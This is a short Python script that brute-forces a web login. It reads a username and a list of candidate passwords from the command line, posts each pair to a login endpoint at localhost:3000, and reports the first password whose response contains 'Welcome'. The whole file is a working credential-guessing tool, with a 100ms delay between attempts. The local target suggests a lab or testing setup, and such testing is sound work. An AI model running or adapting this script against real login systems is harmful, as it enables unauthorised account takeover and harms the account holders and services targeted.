import sys
import requests
import time

username = sys.argv[1]
passwords = sys.argv[2].split('\n')
url = 'http://localhost:3000/login'

for pwd in passwords:
    data = {'username': username, 'password': pwd}
    resp = requests.post(url, data=data)
    if 'Welcome' in resp.text:
        print(f'Success: {username}:{pwd}')
        break
    else:
        print(f'Failed: {pwd}')
    time.sleep(0.1)  # 100ms delay 